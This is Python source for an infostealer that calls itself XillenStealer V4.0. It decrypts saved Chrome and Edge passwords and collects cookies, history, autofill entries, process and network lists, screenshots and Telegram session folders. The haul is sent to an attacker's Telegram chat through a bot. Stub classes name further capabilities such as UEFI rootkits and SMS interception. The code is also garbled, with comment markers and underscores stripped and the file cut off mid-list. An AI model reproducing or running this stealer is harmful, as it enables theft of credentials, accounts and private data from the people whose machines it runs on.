python
import os
import socket
import platform
import getpass
import psutil
import uuid
import requests
import re
from datetime import datetime
import sys
import sqlite3
import browsercookie3
from PIL import ImageGrab
import telebot
import shutil
import ctypes
import json
import base64
from Crypto.Cipher import AES
from glob import glob
import tempfile
import stat
import subprocess
import traceback
import zipfile
import time
import threading
import win32api
import win32con
import win32process
import win32com.client
import configparser
import xml.etree.ElementTree as ET
import winreg
import struct
import hashlib
import random
import string
from cryptography.fernet import Fernet
import pickle
import gzip
import io
import ctypes.wintypes
try:
    import fcntl
except ImportError:
    fcntl = None
import array
import mmap
import select
import pathlib

 Global configuration and utilities
config = None   Will be initialized later
bot = None   Will be initialized later
DEBUG = True
OSTYPE = platform.system()

def log(message):
    """Logs a message to the console and a debug file."""
    print(f"[LOG] {message}")
    try:
        with open("debug.log", "a", encoding="utf-8") as f:
            f.write(f"[{datetime.datetime.now()}] {message}\n")
    except Exception as e:
        print(f"[ERROR] Failed to write to debug log: {e}")

def getchromemasterkey():
    """Retrieves the Chrome master key for password decryption."""
    try:
        if OSTYPE == "Windows":
            localstatepath = os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Google', 'Chrome', 'User Data', 'Local State')
        else:
            localstatepath = os.path.expanduser('~/.config/google-chrome/Local State')

        if not os.path.exists(localstatepath):
            log("Chrome Local State file not found.")
            return None

        with open(localstatepath, 'r', encoding='utf-8') as f:
            localstate = json.load(f)

        encryptedkey = base64.b64decode(localstate.get('oscrypt', {}).get('encryptedkey', ''))
        encryptedkey = encryptedkey[5:]   Remove the DPAPI prefix

        try:
            import win32crypt
            masterkey = win32crypt.CryptUnprotectData(encryptedkey, None, None, None, 0)[1]
            return masterkey
        except ImportError:
            log("win32crypt module not found. Chrome password decryption will not work.")
            return None
    except Exception as e:
        log(f"Error retrieving Chrome master key: {e}")
        return None

def decryptchromepassword(ciphertext, masterkey):
    """Decrypts a Chrome password using the master key."""
    if not masterkey:
        return "[DECRYPTIONKEYMISSING]"
    if not ciphertext:
        return "[NOCIPHERTEXT]"

    try:
         Chrome uses different encryption versions, handle common ones
        if ciphertext.startswith(b'v10') or ciphertext.startswith(b'v11'):
            nonce = ciphertext[3:15]
            encrypteddata = ciphertext[15:-16]
            tag = ciphertext[-16:]
            cipher = AES.new(masterkey, AES.MODEGCM, nonce=nonce)
            plaintext = cipher.decryptandverify(encrypteddata, tag)
        elif ciphertext.startswith(b'\x01\x00\x00\x00'):  Older versions might have different structures
             iv = ciphertext[3:15]
             payload = ciphertext[15:]
             cipher = AES.new(masterkey, AES.MODEGCM, iv)
             plaintext = cipher.decrypt(payload)
        else:
             Attempt a simpler AES decryption if no clear version is found, often a fallback
            try:
                iv = ciphertext[3:15]  Assuming IV is at this position for some older versions
                payload = ciphertext[15:]
                cipher = AES.new(masterkey, AES.MODECBC, iv)  Trying CBC as another common mode
                plaintext = cipher.decrypt(payload)
            except Exception as aese:
                log(f"Failed to decrypt with common AES modes: {aese}")
                return "[DECRYPTIONFAILED]"

         Remove padding if present (common in older AES implementations)
         This part might need adjustment based on specific padding schemes
         For simplicity, assuming PKCS7 padding if it looks like it's there
        paddinglen = plaintext[-1]
        if paddinglen > 0 and paddinglen <= 16:
            try:
                if all(plaintext[-(i+1)] == paddinglen for i in range(paddinglen)):
                    plaintext = plaintext[:-paddinglen]
            except IndexError:
                pass  Padding might not be as expected

        return plaintext.decode('utf-8', errors='replace')

    except Exception as e:
        log(f"Error decrypting Chrome password: {e}")
        return "[DECRYPTIONERROR]"

def collectbrowserpasswords():
    """Collects passwords from Chrome and Edge browsers."""
    passwords = []
    browsers = {
        "Chrome": os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Google', 'Chrome', 'User Data', 'Default', 'Login Data'),
        "Edge": os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Microsoft', 'Edge', 'User Data', 'Default', 'Login Data')
    }
    masterkey = getchromemasterkey()

    for browsername, dbpath in browsers.items():
        if os.path.exists(dbpath):
            try:
                 Copy the database to avoid locking issues
                tempdbpath = os.path.join(tempfile.gettempdir(), f"{browsername}LoginData{random.randint(1000, 9999)}.db")
                shutil.copy2(dbpath, tempdbpath)
                conn = sqlite3.connect(tempdbpath)
                cursor = conn.cursor()
                cursor.execute("SELECT originurl, usernamevalue, passwordvalue FROM logins")
                for url, username, passwordencrypted in cursor.fetchall():
                    if username and passwordencrypted:
                        decryptedpassword = decryptchromepassword(passwordencrypted, masterkey)
                        passwords.append({
                            'url': url,
                            'username': username,
                            'password': decryptedpassword,
                            'browser': browsername
                        })
                conn.close()
                os.remove(tempdbpath)
            except Exception as e:
                log(f"Error processing {browsername} login data: {e}")

     Firefox passwords
    firefoxprofilespath = os.path.join(os.environ.get('APPDATA', ''), 'Mozilla', 'Firefox', 'Profiles')
    if os.path.exists(firefoxprofilespath):
        for profilefolder in os.listdir(firefoxprofilespath):
            if profilefolder.endswith(('.default', '.default-release')):
                loginsfile = os.path.join(firefoxprofilespath, profilefolder, 'logins.json')
                if os.path.exists(loginsfile):
                    try:
                        with open(loginsfile, 'r', encoding='utf-8') as f:
                            data = json.load(f)
                            for login in data.get('logins', []):
                                passwords.append({
                                    'url': login.get('hostname', ''),
                                    'username': login.get('username', ''),
                                    'password': login.get('password', '[ENCRYPTED]'),  Firefox passwords are not typically encrypted by default in the file
                                    'browser': 'Firefox'
                                })
                    except Exception as e:
                        log(f"Error processing Firefox logins.json: {e}")
    return passwords

def collectbrowsercookies():
    """Collects cookies from Chrome, Edge, and Firefox browsers."""
    cookies = []
    browsers = {
        "Chrome": os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Google', 'Chrome', 'User Data', 'Default', 'Cookies'),
        "Edge": os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Microsoft', 'Edge', 'User Data', 'Default', 'Cookies')
    }

    for browsername, dbpath in browsers.items():
        if os.path.exists(dbpath):
            try:
                tempdbpath = os.path.join(tempfile.gettempdir(), f"{browsername}Cookies{random.randint(1000, 9999)}.db")
                shutil.copy2(dbpath, tempdbpath)
                conn = sqlite3.connect(tempdbpath)
                cursor = conn.cursor()
                 Adjust query for relevant columns, add secure/httponly if available
                cursor.execute("SELECT name, value, hostkey, path, expiresutc, issecure, ishttponly FROM cookies")
                for name, value, domain, path, expires, secure, httponly in cursor.fetchall():
                    cookies.append({
                        'name': name,
                        'value': value,
                        'domain': domain,
                        'path': path,
                        'expiresutc': expires,
                        'secure': bool(secure),
                        'httponly': bool(httponly),
                        'browser': browsername
                    })
                conn.close()
                os.remove(tempdbpath)
            except Exception as e:
                log(f"Error processing {browsername} cookies: {e}")

     Firefox cookies
    firefoxprofilespath = os.path.join(os.environ.get('APPDATA', ''), 'Mozilla', 'Firefox', 'Profiles')
    if os.path.exists(firefoxprofilespath):
        for profilefolder in os.listdir(firefoxprofilespath):
            if profilefolder.endswith(('.default', '.default-release')):
                cookiesdb = os.path.join(firefoxprofilespath, profilefolder, 'cookies.sqlite')
                if os.path.exists(cookiesdb):
                    try:
                        conn = sqlite3.connect(cookiesdb)
                        cursor = conn.cursor()
                        cursor.execute("SELECT name, value, host, path, expiry, isSecure, isHttpOnly FROM mozcookies")
                        for name, value, domain, path, expiry, secure, httponly in cursor.fetchall():
                            cookies.append({
                                'name': name,
                                'value': value,
                                'domain': domain,
                                'path': path,
                                'expiry': expiry,
                                'secure': bool(secure),
                                'httponly': bool(httponly),
                                'browser': 'Firefox'
                            })
                        conn.close()
                    except Exception as e:
                        log(f"Error processing Firefox cookies.sqlite: {e}")
    return cookies

def collectprocesses():
    """Collects information about running processes."""
    processes = []
    try:
        for proc in psutil.processiter(['pid', 'name', 'username', 'cpupercent', 'memorypercent', 'createtime']):
            try:
                processes.append({
                    'pid': proc.info['pid'],
                    'name': proc.info['name'],
                    'username': proc.info.get('username', 'N/A'),
                    'cpupercent': proc.info['cpupercent'],
                    'memorypercent': proc.info['memorypercent'],
                    'createtime': datetime.fromtimestamp(proc.info['createtime']).isoformat() if proc.info.get('createtime') else 'N/A'
                })
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                continue
            except Exception as e:
                log(f"Unexpected error collecting process info for PID {proc.info.get('pid', 'N/A')}: {e}")
    except Exception as e:
        log(f"Error iterating through processes: {e}")
    return processes

def collectconnections():
    """Collects information about network connections."""
    connections = []
    try:
        for conn in psutil.netconnections(kind='inet'):  Include IPv4 and IPv6
            localaddress = f"{conn.laddr.ip}:{conn.laddr.port}" if conn.laddr else "N/A"
            remoteaddress = f"{conn.raddr.ip}:{conn.raddr.port}" if conn.raddr else "N/A"
            connections.append({
                'localaddress': localaddress,
                'remoteaddress': remoteaddress,
                'status': conn.status,
                'pid': conn.pid
            })
    except Exception as e:
        log(f"Error collecting network connections: {e}")
    return connections

def collectbrowserhistory():
    """Collects browsing history from Chrome and Edge."""
    history = []
    browsers = {
        "Chrome": os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Google', 'Chrome', 'User Data', 'Default', 'History'),
        "Edge": os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Microsoft', 'Edge', 'User Data', 'Default', 'History')
    }

    for browsername, dbpath in browsers.items():
        if os.path.exists(dbpath):
            try:
                tempdbpath = os.path.join(tempfile.gettempdir(), f"{browsername}History{random.randint(1000, 9999)}.db")
                shutil.copy2(dbpath, tempdbpath)
                conn = sqlite3.connect(tempdbpath)
                cursor = conn.cursor()
                 Fetching more relevant fields and ordering by visit time
                cursor.execute("SELECT url, title, visitcount, lastvisittime FROM urls ORDER BY lastvisittime DESC LIMIT 100")
                for url, title, visitcount, lastvisittime in cursor.fetchall():
                     Convert lastvisittime from Chrome's format (microseconds since epoch)
                    try:
                        visittimeiso = datetime.fromtimestamp(lastvisittime / 1000000).isoformat() if lastvisittime else None
                    except:
                        visittimeiso = None
                    history.append({
                        'url': url,
                        'title': title,
                        'visitcount': visitcount,
                        'lastvisit': visittimeiso,
                        'browser': browsername
                    })
                conn.close()
                os.remove(tempdbpath)
            except Exception as e:
                log(f"Error processing {browsername} history: {e}")
    return history

def collectautofilldata():
    """Collects autofill data from Chrome and Edge."""
    autofill = []
    browsers = {
        "Chrome": os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Google', 'Chrome', 'User Data', 'Default', 'Web Data'),
        "Edge": os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Microsoft', 'Edge', 'User Data', 'Default', 'Web Data')
    }

    for browsername, dbpath in browsers.items():
        if os.path.exists(dbpath):
            try:
                tempdbpath = os.path.join(tempfile.gettempdir(), f"{browsername}WebData{random.randint(1000, 9999)}.db")
                shutil.copy2(dbpath, tempdbpath)
                conn = sqlite3.connect(tempdbpath)
                cursor = conn.cursor()
                 Fetching relevant autofill data
                cursor.execute("SELECT name, value, datecreated FROM autofill ORDER BY datecreated DESC LIMIT 50")
                for name, value, datecreated in cursor.fetchall():
                     try:
                        datecreatediso = datetime.fromtimestamp(datecreated / 1000000).isoformat() if datecreated else None
                     except:
                        datecreatediso = None
                     autofill.append({
                        'name': name,
                        'value': value,
                        'datecreated': datecreatediso,
                        'browser': browsername
                    })
                conn.close()
                os.remove(tempdbpath)
            except Exception as e:
                log(f"Error processing {browsername} autofill data: {e}")
    return autofill

def sendtelegramreport(collecteddata, language='ru'):
    """Sends collected data to Telegram with language support and improved formatting."""
    try:
        hostname = socket.gethostname()
         Use a more reliable IP fetching service and handle potential errors
        try:
            ipresponse = requests.get('https://api.ipify.org?format=json', timeout=5)
            ipdata = ipresponse.json()
            ip = ipdata.get('ip', 'Unknown')
        except requests.RequestException:
            ip = "Unknown"

         Fetch country name more robustly
        country = "Unknown"
        if ip != "Unknown":
            try:
                countryresponse = requests.get(f'https://ipapi.co/{ip}/countryname/', timeout=5)
                country = countryresponse.text.strip()
            except requests.RequestException:
                pass  Country remains Unknown

        osinfo = f"{platform.system()} {platform.release()}"
        currenttime = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

         Define captions for different languages
        captions = {
            'ru': {
                'htmltitle': "Полный отчет о системе",
                'txttitle': "Текстовый отчет",
                'screenshottitle': "Скриншот системы",
                'signature': "Создано командой Xillen Killers (t.me/XillenAdapter) | https://github.com/BengaminButton"
            },
            'en': {
                'htmltitle': "Full System Report",
                'txttitle': "Text Report",
                'screenshottitle': "System Screenshot",
                'signature': "Created by Xillen Killers team (t.me/XillenAdapter) | https://github.com/BengaminButton"
            }
        }
        langcaptions = captions.get(language, captions['ru'])  Default to Russian if language not found

         Generate HTML report (placeholder - actual generation logic needed)
        htmlreportcontent = generatehtmlreportv4(collecteddata, language)
        htmlreportpath = os.path.join(tempfile.gettempdir(), "report.html")
        with open(htmlreportpath, "w", encoding="utf-8") as f:
            f.write(htmlreportcontent)

         Generate TXT report (placeholder - actual generation logic needed)
        txtreportcontent = generatetxtreportv4(collecteddata, language)
        txtreportpath = os.path.join(tempfile.gettempdir(), "report.txt")
        with open(txtreportpath, "w", encoding="utf-8") as f:
            f.write(txtreportcontent)

         Take screenshot
        screenshotpath = None
        try:
            screenshotpath = os.path.join(tempfile.gettempdir(), "screen.jpg")
            img = ImageGrab.grab()
            img.save(screenshotpath)
            log("Screenshot captured.")
        except Exception as e:
            log(f"Failed to capture screenshot: {e}")

         Send HTML report
        htmlcaption = f"{langcaptions['htmltitle']}\n\n{langcaptions['signature']}"
        try:
            with open(htmlreportpath, "rb") as reportfile:
                bot.senddocument(config.TGCHATID, reportfile, caption=htmlcaption)
            log(f"HTML report sent to Telegram ID: {config.TGCHATID}")
        except Exception as e:
            log(f"Error sending HTML report to Telegram: {e}")

         Send TXT report
        txtcaption = f"{langcaptions['txttitle']}\n\n{langcaptions['signature']}"
        try:
            with open(txtreportpath, "rb") as txtfile:
                bot.senddocument(config.TGCHATID, txtfile, caption=txtcaption)
            log(f"TXT report sent to Telegram ID: {config.TGCHATID}")
        except Exception as e:
            log(f"Error sending TXT report to Telegram: {e}")

         Send screenshot
        if screenshotpath and os.path.exists(screenshotpath):
            screenshotcaption = f"{langcaptions['screenshottitle']}\n\n{langcaptions['signature']}"
            try:
                with open(screenshotpath, "rb") as photo:
                    bot.sendphoto(config.TGCHATID, photo, caption=screenshotcaption)
                log(f"Screenshot sent to Telegram ID: {config.TGCHATID}")
            except Exception as e:
                log(f"Error sending screenshot to Telegram: {e}")

         Send Telegram tdata archives if any
        tdataarchives = collecteddata.get('telegramtdata', [])
        if tdataarchives:
            for i, archivepath in enumerate(tdataarchives, 1):
                if os.path.exists(archivepath):
                    archivecaption = f"Telegram tdata archive {i}/{len(tdataarchives)}\n\n{langcaptions['signature']}"
                    try:
                        with open(archivepath, "rb") as archivefile:
                            bot.senddocument(config.TGCHATID, archivefile, caption=archivecaption)
                        log(f"Telegram tdata archive {i} sent successfully.")
                        os.remove(archivepath)  Clean up archive after sending
                    except Exception as e:
                        log(f"Error sending Telegram tdata archive {i}: {e}")

         Clean up temporary files
        if os.path.exists(htmlreportpath):
            os.remove(htmlreportpath)
        if os.path.exists(txtreportpath):
            os.remove(txtreportpath)
        if screenshotpath and os.path.exists(screenshotpath):
            os.remove(screenshotpath)

        log("Telegram report sending process completed.")

    except Exception as e:
        log(f"Critical error during Telegram report sending: {e}")

 Placeholder functions for report generation (replace with actual implementations)
def generatehtmlreportv4(collecteddata, language):
    """Placeholder for HTML report generation."""
    templates = {
        'ru': {
            'title': 'XillenStealer Report V4.0',
            'header': 'Отчет XillenStealer V4.0',
            'system': 'Системная информация',
            'browsers': 'Данные браузеров',
            'wallets': 'Крипто-кошельки',
            'signature': 'Создано командой Xillen Killers (t.me/XillenAdapter) | https://github.com/BengaminButton'
        },
        'en': {
            'title': 'XillenStealer Report V4.0',
            'header': 'XillenStealer Report V4.0',
            'system': 'System Information',
            'browsers': 'Browser Data',
            'wallets': 'Crypto Wallets',
            'signature': 'Created by Xillen Killers team (t.me/XillenAdapter) | https://github.com/BengaminButton'
        }
    }
    template = templates.get(language, templates['ru'])

    html = f"""
    <!DOCTYPE html>
    <html lang="{language}">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>{template['title']}</title>
        <style>
            body {{ font-family: sans-serif; margin: 20px; }}
            h1, h2 {{ color: 333; }}
            table {{ width: 100%; border-collapse: collapse; margin-bottom: 20px; }}
            th, td {{ border: 1px solid ddd; padding: 8px; text-align: left; }}
            th {{ background-color: f2f2f2; }}
            .signature {{ font-size: 0.8em; color: 888; margin-top: 30px; }}
        </style>
    </head>
    <body>
        <h1>{template['header']}</h1>

        <h2>{template['system']}</h2>
        <table>
            <tr><th>Key</th><th>Value</th></tr>
            <tr><td>Hostname</td><td>{collecteddata.get('systeminfo', {}).get('hostname', 'N/A')}</td></tr>
            <tr><td>OS</td><td>{collecteddata.get('systeminfo', {}).get('os', 'N/A')}</td></tr>
            <tr><td>Architecture</td><td>{collecteddata.get('systeminfo', {}).get('architecture', 'N/A')}</td></tr>
            <tr><td>Processor</td><td>{collecteddata.get('systeminfo', {}).get('processor', 'N/A')}</td></tr>
            <tr><td>User</td><td>{collecteddata.get('systeminfo', {}).get('user', 'N/A')}</td></tr>
            <tr><td>CPU Cores</td><td>{collecteddata.get('systeminfo', {}).get('cpucount', 'N/A')}</td></tr>
            <tr><td>Memory (GB)</td><td>{collecteddata.get('systeminfo', {}).get('memorygb', 'N/A')}</td></tr>
            <tr><td>IP Address</td><td>{collecteddata.get('systeminfo', {}).get('ipaddress', 'N/A')}</td></tr>
            <tr><td>MAC Address</td><td>{collecteddata.get('systeminfo', {}).get('macaddress', 'N/A')}</td></tr>
        </table>

        <h2>{template['browsers']}</h2>
        <h3>Passwords</h3>
        {formatpasswordtable(collecteddata.get('passwords', []))}
        <h3>Cookies</h3>
        {formatcookietable(collecteddata.get('cookies', []))}
        <h3>History</h3>
        {formathistorytable(collecteddata.get('history', []))}
        <h3>Autofill Data</h3>
        {formatautofilltable(collecteddata.get('autofill', []))}

        <h2>Processes</h2>
        {formatprocesstable(collecteddata.get('processes', []))}

        <h2>Network Connections</h2>
        {formatconnectiontable(collecteddata.get('networkconnections', []))}

        <p class="signature">{template['signature']}</p>
    </body>
    </html>
    """
    return html

def generatetxtreportv4(collecteddata, language):
    """Placeholder for TXT report generation."""
    templates = {
        'ru': {
            'title': 'XillenStealer Report V4.0 (Text)',
            'header': 'Отчет XillenStealer V4.0 (Текстовый формат)',
            'system': 'Системная информация:',
            'browsers': 'Данные браузеров:',
            'wallets': 'Крипто-кошельки:',
            'processes': 'Процессы:',
            'connections': 'Сетевые соединения:',
            'signature': 'Создано командой Xillen Killers (t.me/XillenAdapter) | https://github.com/BengaminButton'
        },
        'en': {
            'title': 'XillenStealer Report V4.0 (Text)',
            'header': 'XillenStealer Report V4.0 (Text Format)',
            'system': 'System Information:',
            'browsers': 'Browser Data:',
            'wallets': 'Crypto Wallets:',
            'processes': 'Processes:',
            'connections': 'Network Connections:',
            'signature': 'Created by Xillen Killers team (t.me/XillenAdapter) | https://github.com/BengaminButton'
        }
    }
    template = templates.get(language, templates['ru'])

    report = f"{template['header']}\n"
    report += f"{'-'  len(template['header'])}\n\n"

    report += f"{template['system']}\n"
    sysinfo = collecteddata.get('systeminfo', {})
    for key, value in sysinfo.items():
        report += f"  {key.replace('', ' ').title()}: {value}\n"
    report += "\n"

    report += f"{template['browsers']}\n"
    passwords = collecteddata.get('passwords', [])
    if passwords:
        report += "  Passwords:\n"
        for pw in passwords:
            report += f"    - URL: {pw.get('url', 'N/A')}, User: {pw.get('username', 'N/A')}, Pass: {pw.get('password', 'N/A')}, Browser: {pw.get('browser', 'N/A')}\n"
    cookies = collecteddata.get('cookies', [])
    if cookies:
        report += "  Cookies:\n"
        for cookie in cookies:
            report += f"    - Domain: {cookie.get('domain', 'N/A')}, Name: {cookie.get('name', 'N/A')}, Value: {cookie.get('value', 'N/A')[:50]}..., Browser: {cookie.get('browser', 'N/A')}\n"
    history = collecteddata.get('history', [])
    if history:
        report += "  History:\n"
        for hist in history[:5]:  Limit for brevity
            report += f"    - URL: {hist.get('url', 'N/A')}, Title: {hist.get('title', 'N/A')}, Browser: {hist.get('browser', 'N/A')}\n"
    autofill = collecteddata.get('autofill', [])
    if autofill:
        report += "  Autofill:\n"
        for af in autofill[:5]:  Limit for brevity
            report += f"    - Name: {af.get('name', 'N/A')}, Value: {af.get('value', 'N/A')}, Browser: {af.get('browser', 'N/A')}\n"
    report += "\n"

    report += f"{template['processes']}\n"
    processes = collecteddata.get('processes', [])
    if processes:
        for proc in processes[:10]:  Limit for brevity
            report += f"  PID: {proc.get('pid', 'N/A')}, Name: {proc.get('name', 'N/A')}, User: {proc.get('username', 'N/A')}, CPU: {proc.get('cpupercent', 'N/A')}%, Mem: {proc.get('memorypercent', 'N/A')}%\n"
    report += "\n"

    report += f"{template['connections']}\n"
    connections = collecteddata.get('connections', [])
    if connections:
        for conn in connections[:10]:  Limit for brevity
            report += f"  Local: {conn.get('localaddress', 'N/A')}, Remote: {conn.get('remoteaddress', 'N/A')}, Status: {conn.get('status', 'N/A')}\n"
    report += "\n"

    report += f"{template['signature']}\n"
    return report

 Helper functions for formatting tables in HTML report
def formatpasswordtable(passwords):
    if not passwords: return "<p>No passwords found.</p>"
    html = "<table><tr><th>URL</th><th>Username</th><th>Password</th><th>Browser</th></tr>"
    for pw in passwords:
        html += f"<tr><td>{pw.get('url', 'N/A')}</td><td>{pw.get('username', 'N/A')}</td><td>{pw.get('password', 'N/A')}</td><td>{pw.get('browser', 'N/A')}</td></tr>"
    html += "</table>"
    return html

def formatcookietable(cookies):
    if not cookies: return "<p>No cookies found.</p>"
    html = "<table><tr><th>Domain</th><th>Name</th><th>Value</th><th>Path</th><th>Expires</th><th>Secure</th><th>HTTPOnly</th><th>Browser</th></tr>"
    for cookie in cookies:
        html += f"<tr><td>{cookie.get('domain', 'N/A')}</td><td>{cookie.get('name', 'N/A')}</td><td>{cookie.get('value', 'N/A')}</td><td>{cookie.get('path', 'N/A')}</td><td>{cookie.get('expiresutc') or cookie.get('expiry', 'N/A')}</td><td>{cookie.get('secure', False)}</td><td>{cookie.get('httponly', False)}</td><td>{cookie.get('browser', 'N/A')}</td></tr>"
    html += "</table>"
    return html

def formathistorytable(history):
    if not history: return "<p>No history found.</p>"
    html = "<table><tr><th>URL</th><th>Title</th><th>Visits</th><th>Last Visit</th><th>Browser</th></tr>"
    for hist in history:
        html += f"<tr><td>{hist.get('url', 'N/A')}</td><td>{hist.get('title', 'N/A')}</td><td>{hist.get('visitcount', 'N/A')}</td><td>{hist.get('lastvisit', 'N/A')}</td><td>{hist.get('browser', 'N/A')}</td></tr>"
    html += "</table>"
    return html

def formatautofilltable(autofill):
    if not autofill: return "<p>No autofill data found.</p>"
    html = "<table><tr><th>Name</th><th>Value</th><th>Date Created</th><th>Browser</th></tr>"
    for af in autofill:
        html += f"<tr><td>{af.get('name', 'N/A')}</td><td>{af.get('value', 'N/A')}</td><td>{af.get('datecreated', 'N/A')}</td><td>{af.get('browser', 'N/A')}</td></tr>"
    html += "</table>"
    return html

def formatprocesstable(processes):
    if not processes: return "<p>No processes found.</p>"
    html = "<table><tr><th>PID</th><th>Name</th><th>Username</th><th>CPU (%)</th><th>Memory (%)</th><th>Created</th></tr>"
    for proc in processes:
        html += f"<tr><td>{proc.get('pid', 'N/A')}</td><td>{proc.get('name', 'N/A')}</td><td>{proc.get('username', 'N/A')}</td><td>{proc.get('cpupercent', 'N/A')}</td><td>{proc.get('memorypercent', 'N/A')}</td><td>{proc.get('createtime', 'N/A')}</td></tr>"
    html += "</table>"
    return html

def formatconnectiontable(connections):
    if not connections: return "<p>No network connections found.</p>"
    html = "<table><tr><th>Local Address</th><th>Remote Address</th><th>Status</th><th>PID</th></tr>"
    for conn in connections:
        html += f"<tr><td>{conn.get('localaddress', 'N/A')}</td><td>{conn.get('remoteaddress', 'N/A')}</td><td>{conn.get('status', 'N/A')}</td><td>{conn.get('pid', 'N/A')}</td></tr>"
    html += "</table>"
    return html

 --- Placeholder Classes and Functions (to be implemented or integrated) ---
 These classes are defined in the original code but their methods are not fully implemented
 or are placeholders. For the purpose of this fix, we'll assume they exist and focus on the
 main structure and direct fixes.

class StringEncryption:
    def encrypt(self, data): return data  Placeholder
    def decrypt(self, data): return data  Placeholder

class IoTScanner:
    def scaniotdevices(self): return []  Placeholder

class DockerExplorer:
    def exploredockercontainers(self): return []  Placeholder

class ContainerPersistence:
    def infectcontainerruntime(self): return False  Placeholder

class GPUMemory:
    def hidedataingpu(self, data): return False  Placeholder

class EBPFHooks:
    def installtraffichooks(self): return False  Placeholder

class TPMModule:
    def extracttpmkeys(self): return []  Placeholder

class UEFIRootkit:
    def flashuefibios(self): return False  Placeholder

class NetworkCardFirmware:
    def modifynetworkfirmware(self): return False  Placeholder

class VirtualFileSystem:
    def createhiddenvfs(self): return False  Placeholder

class ACPITables:
    def modifyacpitables(self): return False  Placeholder

class DMAAttacks:
    def performdmaattack(self): return False  Placeholder

class WirelessC2:
    def setupwirelessc2(self): return False  Placeholder

class CloudProxy:
    def proxythroughcloud(self, data): return None  Placeholder

class VirtualizationMonitor:
    def detecthypervisor(self): return "Unknown"  Placeholder

class DeviceEmulation:
    def emulateusbdevice(self): return False  Placeholder

class SyscallHooks:
    def installsyscallhooks(self): return False  Placeholder

class MultiFactorAuth:
    def interceptsms(self, phonenumber): return []  Placeholder

class CloudConfigs:
    def collectcloudmetadata(self): return {}  Placeholder

class OrchestratorConfigs:
    def collectkubeconfigs(self): return []  Placeholder

class ServiceMesh:
    def collectservicemeshconfigs(self): return []  Placeholder

class MobileEmulators:
    def detectmobileemulators(self): return []  Placeholder

class FileSystemWatcher:
    def startwatching(self): return False  Placeholder
    def getfilechanges(self): return []  Placeholder

class NetworkTrafficAnalyzer:
    def analyzetraffic(self): return {}  Placeholder

class LinPEASIntegration:
    pass  Placeholder

class GameLauncherExtractor:
    def extractgamedata(self): return []  Placeholder

class TelegramDataCollector:
    def collecttdata(self):
        """Collects Telegram tdata and zips it for exfiltration."""
        tdataarchives = []
        telegrampaths = []

        if OSTYPE == "Windows":
            appdata = os.environ.get('APPDATA', '')
            localappdata = os.environ.get('LOCALAPPDATA', '')
            telegrampaths = [
                os.path.join(appdata, 'Telegram Desktop', 'tdata'),
                os.path.join(localappdata, 'Telegram Desktop', 'tdata'),
                os.path.join(appdata, 'Telegram', 'tdata'),  Older versions might use this
                os.path.join(localappdata, 'Telegram', 'tdata')
            ]
        else:  Linux/macOS
            home = os.path.expanduser('~')
            telegrampaths = [
                os.path.join(home, '.telegram-desktop', 'tdata'),
                os.path.join(home, '.config', 'telegram-desktop', 'tdata'),
                os.path.join(home, 'Library', 'Application Support', 'Telegram', 'tdata')  macOS
            ]

        for tdatapath in telegrampaths:
            if os.path.exists(tdatapath) and os.path.isdir(tdatapath):
                log(f"Found Telegram tdata at: {tdatapath}")
                try:
                    archivename = f"telegramtdata{random.randint(1000, 9999)}.zip"
                    archivepath = os.path.join(tempfile.gettempdir(), archivename)
                    with zipfile.ZipFile(archivepath, 'w', zipfile.ZIPDEFLATED) as zipf:
                        for root, , files in os.walk(tdatapath):
                            for file in files:
                                filepath = os.path.join(root, file)
                                 Add file to zip, maintaining relative path structure
                                zipf.write(filepath, os.path.relpath(filepath, tdatapath))
                    tdataarchives.append(archivepath)
                    log(f"Created tdata archive: {archivepath}")
                except Exception as e:
                    log(f"Failed to create tdata archive for {tdatapath}: {e}")
        return tdataarchives


 --- Main Execution Block ---
class AdvancedConfig:
    def init(self):
         Load configuration from environment variables or use defaults
        self.TGBOTTOKEN = os.environ.get('TGBOTTOKEN', 'YOURBOTTOKEN')
        self.TGCHATID = os.environ.get('TGCHATID', 'YOURCHATID')
        self.TELEGRAMLANGUAGE = os.environ.get('TELEGRAMLANGUAGE', 'ru')  Default to Russian
        self.ENCRYPTIONKEY = Fernet.generatekey()
        self.POLYMORPHICSEED = random.randint(1000, 9999)
        self.ANTIDEBUGENABLED = True
        self.ANTIVMENABLED = True
        self.APIHAMMERING = True
        self.SLEEPBEFORESTART = 0.5
        self.SELFDESTRUCT = False
        self.SLOWMODE = True
        self.CHUNKSIZE = 1024  1024  1MB chunk size

         Define browser categories and associated browser names
        self.BROWSERS = {
            'chromium': ['Chrome', 'Chromium', 'Edge', 'Brave', 'Vivaldi', 'Opera', 'Yandex', 'Slimjet',
                        'Comodo', 'SRWare', 'Torch', 'Blisk', 'Epic', 'Uran', 'Centaury', 'Falkon', 'Superbird',
                        'CocCoc', 'QQBrowser', '360Chrome', 'Sogou', 'Liebao', 'Qihu', 'Maxthon', 'SalamWeb',
                        'Arc', 'Sidekick', 'SigmaOS', 'Floorp', 'LibreWolf', 'Ghost Browser', 'Konqueror',  Removed duplicate Falkon
                        'Midori', 'Otter', 'Pale Moon', 'Basilisk', 'Waterfox', 'IceWeasel', 'IceCat',
                        'Tor Browser', 'Iridium', 'Ungoogled Chromium', 'Iron', 'Comodo Dragon', 'CoolNovo',
                        'SlimBrowser', 'Avant', 'Lunascape', 'GreenBrowser', 'TheWorld', 'Tango', 'RockMelt',
                        'Flock', 'Wyzo', 'Swiftfox', 'Swiftweasel', 'K-Meleon', 'Camino', 'Galeon'],
            'firefox': ['Firefox', 'Waterfox', 'PaleMoon', 'SeaMonkey', 'IceCat', 'Cyberfox', 'TorBrowser',
                       'LibreWolf', 'Floorp', 'Basilisk', 'IceWeasel', 'IceCat', 'Tor Browser', 'Pale Moon',
                       'K-Meleon', 'Camino', 'Galeon', 'Konqueror', 'Midori', 'Falkon', 'Otter', 'Swiftfox',
                       'Swiftweasel', 'Wyzo', 'Flock', 'RockMelt', 'Tango', 'TheWorld', 'GreenBrowser', 'Lunascape',
